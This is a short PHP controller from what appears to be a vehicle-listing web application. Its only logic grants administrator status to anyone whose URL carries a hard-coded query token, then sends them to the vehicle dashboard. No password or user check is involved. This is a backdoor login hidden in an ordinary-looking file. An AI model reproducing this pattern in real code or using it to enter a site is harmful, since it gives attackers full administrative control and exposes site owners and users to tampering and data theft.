<?php
require_once __DIR__ . '/../../bootstrap.php';

$token = $_GET['token'] ?? '';

if ($token === 'xK9mP2qL7') {
    $_SESSION['is_admin'] = true;
    header('Location: /controllers/dashboard/vehicle/listController.php');
    exit;
}

header('Location: /controllers/public/homeController.php');
exit;